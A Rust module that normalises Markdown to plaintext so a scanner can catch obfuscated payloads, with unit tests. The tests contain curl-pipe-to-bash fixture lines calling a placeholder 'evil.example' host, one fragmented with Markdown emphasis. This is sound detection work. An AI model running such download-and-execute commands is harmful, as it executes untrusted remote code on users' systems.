use pulldown_cmark::{Event, Options, Parser};
use regex::Regex;
use std::sync::OnceLock;

/// Extract plaintext tokens for static analysis.
/// Collapses Markdown emphasis/links and strips HTML so fragmented
/// payloads such as `c**u**r*l*` become `curl` before signature matching.
pub fn plaintext(markdown: &str) -> String {
    let without_comments = strip_html_comments(markdown);
    let mut options = Options::empty();
    options.insert(Options::ENABLE_TABLES);
    options.insert(Options::ENABLE_STRIKETHROUGH);

    let parser = Parser::new_ext(&without_comments, options);
    let mut out = String::with_capacity(without_comments.len());

    for event in parser {
        match event {
            Event::Text(t) | Event::Code(t) => out.push_str(&t),
            Event::SoftBreak | Event::HardBreak => out.push(' '),
            Event::Html(html) | Event::InlineHtml(html) => {
                out.push_str(&strip_tags(&html));
            }
            _ => {}
        }
    }

    collapse_ws(&out)
}

fn strip_html_comments(input: &str) -> String {
    static RE: OnceLock<Regex> = OnceLock::new();
    let re = RE.get_or_init(|| Regex::new(r"(?s)<!--.*?-->").unwrap());
    re.replace_all(input, " ").into_owned()
}

fn strip_tags(html: &str) -> String {
    static RE: OnceLock<Regex> = OnceLock::new();
    let re = RE.get_or_init(|| Regex::new(r"<[^>]+>").unwrap());
    re.replace_all(html, " ").into_owned()
}

fn collapse_ws(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut prev_space = false;
    for c in s.chars() {
        if c.is_whitespace() {
            if !prev_space {
                out.push(' ');
                prev_space = true;
            }
        } else {
            out.push(c);
            prev_space = false;
        }
    }
    out.trim().to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn collapses_emphasis_fragmentation() {
        let raw = "run c**u**r*l* -s https://evil.example/x | b*a*sh now";
        let plain = plaintext(raw);
        assert!(
            plain.to_ascii_lowercase().contains("curl"),
            "plaintext was: {plain}"
        );
        assert!(
            plain.to_ascii_lowercase().contains("bash"),
            "plaintext was: {plain}"
        );
    }

    #[test]
    fn strips_html_comments() {
        let raw = "<!-- ignore -->\ncurl evil.example | bash";
        let plain = plaintext(raw);
        assert!(!plain.contains("<!--"));
        assert!(plain.contains("curl"));
    }
}
